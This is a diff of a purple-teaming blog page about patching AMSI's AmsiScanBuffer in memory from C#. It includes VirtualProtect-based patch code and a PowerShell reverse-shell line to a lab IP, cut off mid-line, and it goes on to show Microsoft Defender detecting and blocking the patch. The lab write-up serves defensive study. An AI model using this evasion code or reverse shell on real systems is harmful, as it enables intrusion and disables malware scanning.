@@ -12,7 +12,6 @@ permalink: /solo-purple-teaming/when-patching-does-not-go-as-planned/
 <h1>When Patching Does Not Go As Planned</h1>
 </section>
 <section class="spt-content">
-<p>Owner: Mike Sterrett</p>
 <h2 id="dart-introduction">🎯 Introduction</h2>
 <p>In cybersecurity, there is a continuous cat-and-mouse game between
 offensive and defensive strategies. Every evasion method, including AMSI
@@ -54,24 +53,25 @@ function.</li>
 <li><code>VirtualProtect</code> changes memory permissions to allow
 patching.</li>
 </ul>
-<pre><code>[DllImport(&quot;kernel32.dll&quot;)]
+[DllImport("kernel32.dll")]
 public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
-[DllImport(&quot;kernel32.dll&quot;)]
-public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);</code></pre>
+[DllImport("kernel32.dll")]
+public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
 <hr />
 <h2 id="wrench-writing-the-patch-function">🔧 Writing the Patch
 Function</h2>
 <h3 id="c--patch-method">C# – <code>Patch()</code> Method</h3>
-<pre><code>static void Patch()
+static void Patch()
 {
     Process thisProcess = Process.GetCurrentProcess();
 
     foreach (ProcessModule module in thisProcess.Modules)
     {
-        if (module.ModuleName.Equals(&quot;amsi.dll&quot;, StringComparison.OrdinalIgnoreCase))
+        if (module.ModuleName.Equals("amsi.dll", StringComparison.OrdinalIgnoreCase))
         {
-            IntPtr pointer = GetProcAddress(module.BaseAddress, &quot;AmsiScanBuffer&quot;);
+            IntPtr pointer = GetProcAddress(module.BaseAddress, "AmsiScanBuffer");
             uint oldProtect;
             bool success = VirtualProtect(pointer, (UIntPtr)0x1, 0x40, out oldProtect);
             if (success)
@@ -83,7 +83,8 @@ Function</h2>
             }
         }
     }
-}</code></pre>
+}
+
 <hr />
 <h2 id="gear-triggering-amsi-load-safely">⚙️ Triggering AMSI Load
 Safely</h2>
@@ -94,13 +95,13 @@ PowerShell executes."</p>
 <p>We want to avoid loading a malicious payload too early. Instead, use
 a safe PowerShell command to trigger AMSI loading.</p>
 <h3 id="powershell-trigger">PowerShell Trigger</h3>
-<pre><code>static void Main(string[] args)
+static void Main(string[] args)
 {
     Console.ReadLine();
     PowerShell ps = PowerShell.Create();
-    string script = &quot;whoami&quot;; 
+    string script = "whoami"; 
     ps.AddScript(script)
-    Collection&lt;PSObject&gt; results = ps.Invoke();
+    Collection<PSObject> results = ps.Invoke();
     
     foreach (PSObject obj in results)
     {    
@@ -108,24 +109,26 @@ a safe PowerShell command to trigger AMSI loading.</p>
     }
     patch();
     Console.ReadLine();
-    script = &quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;10.0.3.2&#39;,4242);$stream = $client.GetStream();[byte[]]$byte
+    script = "$client = New-Object System.Net.Sockets.TCPClient('10.0.3.2',4242);$stream = $client.GetStream();[byte[]]$byte
     ps.AddScript(script);
     results = ps.Invoke();
     
     foreach (PSObject obj in results)
     {
         Console.WriteLine(obj.ToString());
-    }</code></pre>
+    }
+
 <hr />
 <h2 id="test_tube-execution-steps">🧪 Execution Steps</h2>
 <ol type="1">
 <li><p>Open a terminal and run the commands below:</p>
-<pre><code>cd source/repos/AttachDebuggerTest/AttachDebuggerTest/bin/x64/Debug
-AttachDebuggerTest.exe</code></pre></li>
+cd source/repos/AttachDebuggerTest/AttachDebuggerTest/bin/x64/Debug
+AttachDebuggerTest.exe
+</li>
 <li><p>Open <strong>System Informer</strong> (or Process
 Hacker).</p></li>
 </ol>
-<p><img src="When%20Patching%20Does%20Not%20Go%20As%20Planned/image.png"
+<p><img src="/_assets/when-patching-does-not-go-as-planned/image.png"
 alt="image.png" /></p>
 <p>As seen above: <code>amsi.dll</code> is <strong>not loaded</strong>
 initially.</p>
@@ -133,7 +136,7 @@ initially.</p>
 <li>Run the script. AMSI will now be loaded.</li>
 </ol>
 <p><img
-src="When%20Patching%20Does%20Not%20Go%20As%20Planned/image%201.png"
+src="/_assets/when-patching-does-not-go-as-planned/image%201.png"
 alt="image.png" /></p>
 <ol type="1">
 <li>The patch executes, attempting to overwrite
@@ -145,7 +148,7 @@ alt="image.png" /></p>
 <p>"Defender just blocked our patch."</p>
 </blockquote>
 <p><img
-src="When%20Patching%20Does%20Not%20Go%20As%20Planned/image%202.png"
+src="/_assets/when-patching-does-not-go-as-planned/image%202.png"
 alt="image.png" /></p>
 <p>After running the patch:</p>
 <ul>
@@ -154,7 +157,7 @@ History</strong>.</li>
 <li>Notice how the patching behavior was detected.</li>
 </ul>
 <p><img
-src="When%20Patching%20Does%20Not%20Go%20As%20Planned/image%203.png"
+src="/_assets/when-patching-does-not-go-as-planned/image%203.png"
 alt="image.png" /></p>
 <blockquote>
 <p>This demonstrates that while the technique works in theory, it has
